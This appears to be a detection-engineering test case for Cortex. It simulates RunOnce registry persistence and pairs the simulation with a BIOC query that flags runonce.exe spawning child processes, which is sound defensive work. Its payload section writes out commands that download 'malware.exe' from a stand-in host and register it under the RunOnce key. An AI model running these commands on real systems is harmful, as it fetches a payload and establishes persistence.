identity.summary: An attacker uses RunOnce.exe to execute a malicious payload, creating a suspicious process tree where RunOnce.exe is the parent of a malicious process. Cortex should detect this behavior as a potentia
identity.description: An attacker uses RunOnce.exe to execute a malicious payload, creating a suspicious process tree where RunOnce.exe is the parent of a malicious process. Cortex should detect this behavior as a potential persistence or execution technique.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code:
cd C:\Users\Public
wget http://192.0.2.10/malware.exe -OutFile malware.exe
stub malware.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Updater" /t REG_SZ /d "C:\Users\Public\malware.exe" /f

expected_artifacts.description: RunOnce.exe process spawning a malicious executable

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious runonce.exe parent process

biocs.logic:

| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'runonce.exe'
| filter action_process_image_name != 'runonce.exe'
